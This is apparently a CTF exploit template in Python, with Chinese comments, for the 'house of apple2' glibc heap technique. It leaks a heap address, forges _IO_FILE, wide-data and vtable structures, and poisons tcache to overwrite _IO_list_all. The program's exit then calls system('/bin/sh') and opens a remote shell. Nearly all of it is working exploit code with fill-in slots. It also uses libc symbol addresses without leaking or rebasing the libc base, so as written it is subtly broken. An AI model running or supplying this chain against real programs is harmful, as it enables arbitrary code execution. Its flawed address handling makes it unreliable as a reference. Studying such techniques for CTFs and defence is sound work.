#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: house of apple2 模板 —— glibc 2.34+ 无 __free_hook/__malloc_hook 时代,
     伪造 _IO_2_1_stdout_ 相关 FILE 结构, 走 _IO_wfile_overflow -> _IO_wdoallocbuf
     -> call [wide_vtable+0x68](fp) 任意函数调用, rdi=FILE 即 system("  /bin/sh")
适用条件:
    - glibc >= 2.34(FSOP 适用面更广, 2.27~2.41 均可), 菜单堆题有 UAF/edit
    - 利用链: 堆漏洞拿到"把堆地址写进 _IO_list_all"的原语(本模板用 tcache poisoning,
       largebin attack 同理, 只换写入原语)
    - 触发: 程序 return/exit 时 _IO_cleanup -> _IO_flush_all 扫链表调 overflow
用法:
    1) 改 CONFIG 区: HOST/PORT/BINARY/LIBC/SAFE_LINKING
    2) Menu 类 4 个函数的选项号/提示符按题目菜单改
    3) 若题目给了直接改 _IO_list_all 的任意写, 把 pwn() 里 poison 段整体替换
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
LIBC_PATH = "./libc.so.6"   # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
SAFE_LINKING = True         # TODO: 改这里: glibc >= 2.32 为 True
GROUP_SIZE = 0x400          # TODO: 改这里: 申请 size(装下 FILE 用大 chunk 稳妥)
# =============================================================

context.arch = "amd64"
context.log_level = "info"
libc = ELF(LIBC_PATH, checksec=False)
SIZE2CHUNK = (GROUP_SIZE + 8 + 0xF) & ~0xF


class Menu:
    """菜单交互封装: 选项号/提示符按题目改"""

    def __init__(self, io):
        self.io = io

    # TODO: 改这里: 4 个函数的选项号与提示符全部按题目菜单调整
    def add(self, size, content=b"a"):
        self.io.sendlineafter(b"choice:", b"1")
        self.io.sendlineafter(b"size:", str(size).encode())
        self.io.sendlineafter(b"content:", content)

    def delete(self, idx):
        self.io.sendlineafter(b"choice:", b"2")
        self.io.sendlineafter(b"index:", str(idx).encode())

    def edit(self, idx, content):
        self.io.sendlineafter(b"choice:", b"3")
        self.io.sendlineafter(b"index:", str(idx).encode())
        self.io.sendlineafter(b"content:", content)

    def show(self, idx):
        self.io.sendlineafter(b"choice:", b"4")
        self.io.sendlineafter(b"index:", str(idx).encode())
        return self.io.recvline_contains(b"content:", timeout=2)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def protect_fd(pos, target):
    """safe-linking: fd = (存放位置地址 >> 12) ^ 目标"""
    return (pos >> 12) ^ target if SAFE_LINKING else target


def build_fake_file(fp_addr, wide_addr, vtbl_addr, lock_addr):
    """伪造 _IO_FILE (关键字段, 其余补 0):
    exit 时 _IO_flush_all 遍历链表, 满足 _mode<=0 且 write_ptr>write_base 就调 _IO_OVERFLOW"""
    return flat({
        0x00: b"  /bin/sh\x00",  # _flags=0x622f2020: 清掉 NO_WRITES/CURRENTLY_PUTTING/UNBUFFERED;
                                 # rdi=fp, 首字节就是 system 的参数(前导空格 system 会跳过)
        0x20: 0,                 # _IO_write_base = 0
        0x28: 1,                 # _IO_write_ptr = 1 > write_base -> 触发 overflow
        0x68: 0,                 # _chain = 0, 防止 flush_all 链到垃圾内存
        0x88: lock_addr,         # _lock 指向可写内存(随便一块堆)
        0xa0: wide_addr,         # _wide_data -> 伪造的 _IO_wide_data
        0xc0: 0,                 # _mode = 0
        0xd8: libc.sym["_IO_wfile_jumps"],  # vtable 指向合法跳表段, 过 _IO_vtable_check
    }, filler=b"\x00")


def build_wide_data(wide_vtbl_addr):
    """伪造 _IO_wide_data (关键字段)"""
    return flat({
        0x18: 0,                 # _IO_write_base = NULL -> 走进 _IO_wdoallocbuf
        0x30: 0,                 # _IO_buf_base = NULL -> 不提前 return
        0xe0: wide_vtbl_addr,    # _wide_vtable -> 伪造跳表(此处不做 vtable 检查)
    }, filler=b"\x00")


def build_wide_vtable(func_addr):
    """伪造 wide vtable: _IO_wdoallocbuf 直接 call [wide_vtable+0x68](fp)"""
    return flat({0x68: func_addr}, filler=b"\x00")   # 0x68 = __doallocate


def pwn():
    io = start()
    m = Menu(io)

    # ---- 堆地址泄露(2.32+): 首 free 进 tcache 的 fd = addr>>12 ----
    m.add(GROUP_SIZE)
    m.delete(0)
    leak = u64(m.show(0).split(b"content:")[1].strip().ljust(8, b"\x00"))
    heap = leak << 12
    log.success(f"heap base = {hex(heap)}")
    # 用户 chunk 布局: 堆基址 + 0x2a0 起, 每 SIZE2CHUNK 一个; 预留 3 块放伪造结构
    fp_addr = heap + 0x2a0
    wide_addr = fp_addr + SIZE2CHUNK
    vtbl_addr = wide_addr + SIZE2CHUNK

    system = libc.sym["system"]
    m.add(GROUP_SIZE, build_fake_file(fp_addr, wide_addr, vtbl_addr, fp_addr))       # idx 0: FILE
    m.add(GROUP_SIZE, build_wide_data(vtbl_addr))                                    # idx 1: wide_data
    m.add(GROUP_SIZE, build_wide_vtable(system))                                     # idx 2: wide_vtable
    m.add(GROUP_SIZE, b"/bin/sh\x00")                                                # idx 3: 占位防串

    # ---- 写入原语: tcache poisoning 让 malloc 返回 &_IO_list_all ----
    # 注意: 下面 idx/地址均按"菜单不复用下标、顺序分配"假设写,
    # TODO: 改这里: 用 gdb heap 命令核对各 chunk 实际地址与当前空闲下标
    m.add(GROUP_SIZE)      # idx 4: A
    m.add(GROUP_SIZE)      # idx 5: B
    m.delete(4)
    m.delete(5)
    b_addr = heap + 0x2a0 + SIZE2CHUNK * 5   # idx5 用户区地址, 供 safe-linking 加密
    m.edit(5, p64(protect_fd(b_addr, libc.sym["_IO_list_all"])))
    m.add(GROUP_SIZE)                       # 取回 B
    m.add(GROUP_SIZE)                       # 返回 _IO_list_all 位置
    m.edit(6, p64(fp_addr))                 # _IO_list_all = 伪造 FILE (fp 在 idx 0)

    # ---- 触发: 程序退出 -> _IO_cleanup -> _IO_flush_all ----
    io.sendlineafter(b"choice:", b"9")      # TODO: 改这里: 退出选项/或让 main return
    io.interactive()                        # system("  /bin/sh") -> shell


if __name__ == "__main__":
    pwn()
